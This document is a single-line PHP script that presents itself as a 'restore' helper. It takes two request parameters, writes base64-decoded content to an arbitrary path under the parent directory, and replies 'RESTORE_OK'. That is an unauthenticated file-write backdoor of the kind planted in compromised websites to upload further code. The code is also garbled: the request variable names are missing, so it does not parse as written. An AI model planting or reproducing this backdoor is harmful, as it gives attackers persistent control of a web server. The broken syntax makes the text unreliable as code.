<?php if(isset(['p']) && isset(['c'])){ file_put_contents(__DIR__.'/../'.['p'], base64_decode(['c'])); echo 'RESTORE_OK'; } exit; ?>
